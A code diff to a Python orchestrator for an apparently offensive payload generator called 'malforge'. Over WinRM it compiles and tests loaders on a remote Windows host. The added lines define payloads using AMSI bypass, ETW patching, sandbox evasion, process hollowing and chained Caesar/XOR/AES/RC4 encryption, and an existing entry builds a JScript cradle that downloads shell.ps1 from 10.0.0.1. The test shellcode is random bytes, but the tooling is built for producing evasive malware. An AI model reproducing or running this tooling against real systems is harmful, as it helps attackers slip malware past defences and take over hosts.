@@ -17,7 +17,9 @@ class MalforgeOrchestrator:
         print(f"[*] Initializing session to {TARGET_IP}...")
         self.session = winrm.Session(f"http://{TARGET_IP}:5985/wsman", auth=(USER, PASS), transport='basic')
         self.local_results = []
-        self.msbuild_path = os.getenv("MALFORGE_MSBUILD", r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe")
+        self.msbuild_path = r"C:\Windows\Sysnative\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe"
+        if not self.session.run_ps(f"Test-Path '{self.msbuild_path}'").std_out.decode().strip() == "True":
+             self.msbuild_path = r"C:\Windows\SysWOW64\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe"
 
     def run_remote_ps(self, script):
         try:
@@ -78,7 +80,14 @@ Remove-Item '{remote_b64}' -Force
             # 1. Compile/Build
             print("  [>] Building...", end="", flush=True)
             if local_file.endswith(".csproj"):
-                cmd = f"& '{self.msbuild_path}' '{remote_src}' /t:Build /p:Configuration=Release /p:OutDir={REMOTE_TEMP}"
+                # Prioritize 64-bit MSBuild to match the WinRM session and updated template
+                cmd = f"""
+$p = @(
+    \"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe\",
+    \"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe\"
+) | Where-Object {{ Test-Path $_ }} | Select-Object -First 1
+if ($p) {{ & $p '{remote_src}' /t:Build /p:Configuration=Release /p:OutDir={REMOTE_TEMP} }} else {{ throw 'MSBuild not found' }}
+"""
             else:
                 target_type = "library" if ("dll" in name.lower() or "installutil" in name.lower()) else "exe"
                 cmd = f"& '{CSC_PATH}' /out:'{remote_target}' /target:{target_type} '{remote_src}'"
@@ -163,7 +172,7 @@ Get-ChildItem '{REMOTE_TEMP}' -Include *.exe,*.dll,*.hex,*.tmp,*.b64,*.csproj -R
 
         # 1. Generate local payloads
         print("[*] Generating local payloads...")
-        os.system("python3 -c \"import os; open('sc.bin', 'wb').write(os.urandom(512))\"")
+        os.system(f"{sys.executable} -c \"import os; open('sc.bin', 'wb').write(os.urandom(512))\"")
         
         # Format: (name, cmd_args, fmt)
         payloads = [
@@ -178,6 +187,10 @@ Get-ChildItem '{REMOTE_TEMP}' -Include *.exe,*.dll,*.hex,*.tmp,*.b64,*.csproj -R
             ("VBA Macro", "-i sc.bin -f macro -e xor --amsi -o macro.vba", "vba"),
             ("JScript Cradle", "-f js --url http://10.0.0.1/shell.ps1 -o cradle.js", "js"),
             ("HTA Runner", "-i sc.bin -f hta -e xor -o runner.hta", "hta"),
+            ("Chained Caesar-XOR-AES", "-i sc.bin -f exe -e caesar,xor,aes --amsi -o chained.cs", "cs"),
+            ("Hollow Stealth RC4", "-i sc.bin -f hollow -e rc4 --amsi --etw --sandbox -o hollow_stealth.cs", "cs"),
+            ("MSBuild AES Chained", "-i sc.bin -f msbuild -e aes,xor -o msbuild_chained.csproj", "cs"),
+            ("PowerShell Triple Enc", "-i sc.bin -f ps1 -e caesar,rc4,xor -o triple.ps1", "ps1"),
         ]
 
         success_count = 0
@@ -187,7 +200,7 @@ Get-ChildItem '{REMOTE_TEMP}' -Include *.exe,*.dll,*.hex,*.tmp,*.b64,*.csproj -R
             match = re.search(r'-o\s+([^\s]+)', args)
             local_out = match.group(1) if match else "output"
             
-            os.system(f"malforge {args}")
+            os.system(f"{sys.executable} -m malforge {args}")
             self.test_payload(name, local_out, fmt)
             # Write progress
             with open("test_report.json", "w") as f:
